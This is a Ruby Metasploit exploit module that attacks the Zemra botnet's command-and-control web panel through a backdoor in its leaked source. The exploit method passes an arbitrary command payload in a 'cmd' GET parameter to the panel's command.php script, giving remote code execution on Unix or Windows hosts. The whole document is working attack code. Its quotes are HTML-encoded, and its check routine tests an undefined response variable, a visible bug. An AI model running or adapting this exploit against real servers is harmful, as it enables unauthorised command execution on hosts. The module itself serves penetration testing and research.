# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Zemra Botnet CnC Web Panel Remote Code Execution&#039;,
      &#039;Description&#039;    => %q{
        This module exploits the CnC web panel of Zemra Botnet which contains a backdoor
        inside its leaked source code. Zemra is a crimeware bot that can be used to
        conduct DDoS attacks and is detected by Symantec as Backdoor.Zemra.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Jay Turla <@shipcod3>&#039;, #Metasploit Module
          &#039;Angel Injection&#039;, #Initial Discovery (PoC from Inj3ct0r Team)
          &#039;Darren Martyn <@info_dox>&#039; #Initial Discovery
        ],
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;http://0day.today/exploit/19259&#039;],
          [&#039;URL&#039;, &#039;http://insecurety.net/?p=144&#039;], #leaked source code and backdoor intro
          [&#039;URL&#039;, &#039;http://www.symantec.com/connect/blogs/ddos-attacks-zemra-bot&#039;]
        ],
      &#039;Privileged&#039;     => false,
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;    => 10000,
          &#039;DisableNops&#039; => true,
          &#039;Compat&#039;      =>
            {
              &#039;PayloadType&#039; => &#039;cmd&#039;
            }
        },
      &#039;Platform&#039;       => %w{ unix win },
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Targets&#039;        =>
        [
          [&#039;zemra panel / Unix&#039;, { &#039;Platform&#039; => &#039;unix&#039; } ],
          [&#039;zemra panel / Windows&#039;, { &#039;Platform&#039; => &#039;win&#039; } ]
        ],
      &#039;DisclosureDate&#039; => &#039;Jun 28 2012&#039;,
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;,[true, "The path of the backdoor inside Zemra Botnet CnC Web Panel", "/Zemra/Panel/Zemra/system/command.php"]),
      ],self.class)
  end

  def check
    txt = Rex::Text.rand_text_alpha(8)
    http_send_command(txt)
    if res && res.body =~ /cmd/
      return Exploit::CheckCode::Vulnerable
    end
    return Exploit::CheckCode::Safe
  end

  def http_send_command(cmd)
    uri = normalize_uri(target_uri.path.to_s)
    res = send_request_cgi({
      &#039;method&#039;  => &#039;GET&#039;,
      &#039;uri&#039;             => uri,
      &#039;vars_get&#039;        =>
        {
          &#039;cmd&#039; => cmd
        }
    })
    unless res && res.code == 200
      fail_with(Failure::Unknown, &#039;Failed to execute the command.&#039;)
    end
    res
  end

  def exploit
    http_send_command(payload.encoded)
  end
end

